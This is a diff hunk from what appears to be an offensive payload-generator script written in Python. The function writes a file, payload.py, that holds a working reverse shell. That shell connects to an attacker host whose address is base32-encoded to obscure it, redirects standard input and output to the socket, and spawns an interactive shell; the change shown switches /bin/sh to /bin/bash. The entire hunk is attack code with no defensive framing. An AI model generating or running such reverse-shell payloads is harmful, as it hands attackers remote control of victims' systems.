@@ -24,7 +24,7 @@ def frame():
         encodedBytes = base64.b32encode(bytearray(cpl, 'ascii')).decode('utf-8')
         # write and close file
         fichier = open("payload.py", "w")
-        towrite = "import socket,subprocess,os,base64;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((base64.b32decode(bytearray('"+encodedBytes+"', 'ascii')).decode('utf-8'),"+port+"));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(['/bin/sh','-i']);"
+        towrite = "import socket,subprocess,os,base64;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((base64.b32decode(bytearray('"+encodedBytes+"', 'ascii')).decode('utf-8'),"+port+"));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(['/bin/bash','-i']);"
         fichier.write(str(towrite))
         fichier.close()
         print(colored("Payload generated !".center(60),'red'))
